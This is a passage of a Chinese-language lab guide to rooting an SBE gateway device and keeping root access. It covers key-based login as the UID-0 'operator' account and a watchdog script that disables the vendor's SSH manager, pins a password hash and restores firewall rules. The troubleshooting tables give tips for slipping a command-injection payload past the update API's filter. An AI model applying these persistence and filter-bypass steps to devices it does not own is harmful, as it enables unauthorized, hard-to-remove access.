  operator@192.168.1.1
```

---

## 步骤 6（可选）：持久化

### 旧固件 1.0.5

```bash
# SSH 连入后执行
/etc/init.d/dropbear enable                      # 开机自启
mkdir -p /etc/dropbear
echo "ssh-ed25519 AAAA...你的公钥..." > /etc/dropbear/authorized_keys
chmod 600 /etc/dropbear/authorized_keys
```

### 新固件 1.1.3.1：持久 SSH 22

真机已验证的管理身份是 `operator`，它的 UID/GID 均为 0；登录后即为 root 权限。不要使用 `root@设备`：厂商 Dropbear 在认证前直接拒绝该用户名，即使 root 密码或公钥正确也无法登录。

已验证的运行态方案：

1. RSA 公钥放到 `/etc/dropbear/authorized_keys`。该路径实际绑定到 p29 `/data/etc/dropbear/authorized_keys`，所以公钥文件跨重启保留。
2. 管理脚本放在可写且可执行的 p35：`/usr/app/sbe_lab_mgmt.sh`。
3. 脚本禁用 `Node_Services` 中的 SSHM 并停止 SSHM；否则其 `always_restart=true` supervisor 会重启它，SSHM 可能修改 operator 密码及 SSH 状态。
4. 脚本恢复固定的 operator SHA-512 密码哈希，配置 Dropbear 监听 TCP 22，并通过 `nfm_ip4tables.sh` 写入仅 `br-home` 可访问的 TCP 22 OVSDB 规则。
5. 每 15 秒检查一次并修复 SSHM、Dropbear、密码和 NFM 规则。不要直接用 `iptables` 添加 22 规则；NFM 重建时会清除不在 OVSDB 期望状态中的规则。

#### 22 端口 operator 免密码登录：完整操作步骤

以下步骤假定已通过 4B 拿到一次 root shell，或已通过现有 `operator@22` 进入 UID 0 shell。`operator` 不是新建账户：它是固件内建、被 Dropbear 允许的唯一稳定用户名，UID/GID 均为 0；不需要也不应执行 `sudo`。

**1. 在本机生成专用 RSA 密钥。**

```bash
ssh-keygen -t rsa -b 3072 \
  -f ~/.ssh/sbe1v1k_operator_rsa \
  -N '' \
  -C 'sbe1v1k-operator-lab'
chmod 600 ~/.ssh/sbe1v1k_operator_rsa
cat ~/.ssh/sbe1v1k_operator_rsa.pub
```

使用 RSA 是为了兼容本机旧版 Dropbear；不要把私钥复制到设备。

**2. 在设备 root shell 中安装公钥。** 把下面的 `<完整 RSA 公钥>` 替换为上一步 `.pub` 文件的整行内容。`grep` 检查可避免重复追加。

```sh
mkdir -p /etc/dropbear
chmod 700 /etc/dropbear
grep -qxF '<完整 RSA 公钥>' /etc/dropbear/authorized_keys 2>/dev/null || \
  printf '%s\n' '<完整 RSA 公钥>' >> /etc/dropbear/authorized_keys
chmod 600 /etc/dropbear/authorized_keys
ls -l /etc/dropbear/authorized_keys
```

`/etc/dropbear` 是 p29 `/data/etc/dropbear` 的绑定挂载，因此这一步的公钥跨重启保留。不要写 `/root/.ssh/authorized_keys`：rootfs 只读，且 `root` 用户名本身会被 Dropbear 拒绝。

**3. 安装并启动 22 管理器。** 已准备好的脚本应位于 p35：`/usr/app/sbe_lab_mgmt.sh`。首次从 root shell 部署脚本后设置执行权限并启动：

```sh
chmod 755 /usr/app/sbe_lab_mgmt.sh
nohup /usr/app/sbe_lab_mgmt.sh </dev/null >/dev/null 2>&1 &
sleep 3
```

脚本会禁用 SSHM、固定 operator 的备用密码哈希、将 Dropbear 设为 22，并通过 NFM 放行仅 LAN（`br-home`）可达的 TCP 22。不要以手工 `iptables` 规则替代它。

**4. 从本机使用免密码密钥登录。**

```bash
ssh -p 22 \
  -i ~/.ssh/sbe1v1k_operator_rsa \
  -o IdentitiesOnly=yes \
  -o HostKeyAlgorithms=+ssh-rsa \
  -o PubkeyAcceptedAlgorithms=+ssh-rsa \
  operator@192.168.1.1
```

预期输出：`uid=0(root) gid=0(root)`。登录不应询问 operator 密码；密码只作为独立备用通道。

如果 SSH 报 `REMOTE HOST IDENTIFICATION HAS CHANGED`，先确认是实验室中的这台 SBE，再删除该 IP 的旧主机密钥记录：

```bash
ssh-keygen -R 192.168.1.1
```

**5. 验证并关闭临时 9999 shell。**

```sh
id
pidof sbe_lab_mgmt.sh       # 应有 PID
pidof sshm || echo 'sshm disabled'
/usr/opensync/bin/nfm_ip4tables.sh -C INPUT -i br-home -p tcp --dport 22 -j ACCEPT

# 确认 operator@22 可登录后，关闭临时 Warehouse root shell：
killall inetd 2>/dev/null
rm -f /tmp/inetd.conf
```

`9999` 只用于首次恢复或故障排查，不是日常管理入口。22 的密钥登录验证成功后应关闭它。

**6. 重启边界（必须理解）。** 上述公钥和 `/usr/app/sbe_lab_mgmt.sh` 都会跨重启保留；但在 `/etc/rc.local` 启动器实际刷入 inactive p28 并验证成功前，重启不会自动启动管理器。此时需再次通过 Warehouse root shell 执行第 3 步的 `nohup` 命令，恢复 22。

已实测：TCP 22 RSA 密钥登录和密码登录均成功，均返回 `uid=0(root) gid=0(root)`。主动删除 NFM 规则并重新启用 SSHM 后，脚本在一个 15 秒周期内恢复 22 和两种登录。

重要更正：本机没有发现"root 每两分钟固定重置"。`/etc/init.d/boot` 仅在启动时按大写序列号设置 root 密码；SSHM 的 `sshAuthPasswd` 事件修改的是 `operator`，不是 root。密码库在 `/tmp/etc/shadow`，因此仍应让上述脚本在每次开机后恢复 operator 状态。

完整的重启持久化候选方案只修改 SquashFS 的 `/etc/rc.local`，使其后台启动 `/usr/app/sbe_lab_mgmt.sh`；策略本身仍留在 p35，后续无需再次重建 rootfs。候选镜像应先写入 inactive p28，保留活动 p27，并在串口/U-Boot 回滚条件下测试。设备报告 `secboot=1`，所以在实际从 p28 启动成功前，不得声称重启持久化已经完成。

---

## 故障排查

### 通用（两版固件）

| 现象 | 原因与处理 |
|---|---|
| curl 连接失败/超时 | 维护主机没接 LAN 口，或设备 IP 不是 192.168.1.1；确认拓扑：测试网络→WAN，维护主机→LAN |
| `get_mode` 返回 `Cloud` | DNS 记录未生效或 WAN 缺 IPv6；检查测试网络配置；**改完配置必须重启 SBE**，modecheck 只在开机跑一次 |
| SBE 拿不到 IPv6，小米 UCI 配置全对 | 小米 IPv6 模式为 off 时残留 `network.lan.ipv6='0'`，netifd 在内核层禁用 br-lan 的 IPv6（`net.ipv6.conf.br-lan.disable_ipv6=1`），odhcpd 日志报 `no public prefix on br-lan` 并拒绝发 RA。诊断：`ip -6 addr show dev br-lan`（应为空）、`uci -q get network.lan.ipv6`（输出 0）。处理：`uci delete network.lan.ipv6; uci commit network; /etc/init.d/network reload; sysctl -w net.ipv6.conf.br-lan.disable_ipv6=0`，重启 odhcpd/dnsmasq 后给 SBE 断电重启 |
| `get_mode` 返回 `INVALID_REQUEST` | 用了 POST 之外的方法，或 body 为空 |
| 第二次请求无效 | 尝试计数器已满；脚本里清 `/tmp/update_attempt_file`、`/tmp/update_firmware_id`，或重启设备 |

### 旧固件 1.0.5

| 现象 | 原因与处理 |
|---|---|
| 发送请求后 22 端口未开 | ① 等（tftp 部分先执行，最坏几分钟）② payload 里混入了空格（必须用 `${IFS}`）③ 混入了 `&` ④ 尝试计数器已满 |
| SSH 密码错误 | 密码是序列号**大写**，用 `get_serial` 确认 |

### 新固件 1.1.3.1

| 现象 | 原因与处理 |
|---|---|
| `INVALID_REQUEST_CHARACTER` | payload 含 `;` `$` `\|` `'` `"`（body 校验拦截）；改用 4B 反引号 + 脚本投递 |
| 卡 `FWS:Working` 很久不动 | ① `tftpserver` 带了 `:port`（设备卡死，**断电恢复**）② 脚本往 stderr 刷大输出撑爆 popen 管道 |
| 脚本执行了但 22 连不上 | 用 `nfm_ip4tables.sh -C INPUT -i br-home -p tcp --dport 22 -j ACCEPT` 检查 OVSDB 规则；不要直接插 raw iptables |
| 密码或公钥正确却仍登录失败 | 用户名不能是 `root` 或自建账号；使用 UID 0 的 `operator` |
| SSHM 又改回状态 | 检查 `ovsh s Node_Services -w service==sshm service enable status`；管理脚本会把它恢复为 disabled |
| 重启后 22 消失 | 当前 p35 脚本会保留，但 rootfs 的 `/etc/rc.local` 启动器尚未刷入；重新获取 shell 后运行 `/usr/app/sbe_lab_mgmt.sh &`，或完成 inactive p28 候选启动测试 |

---
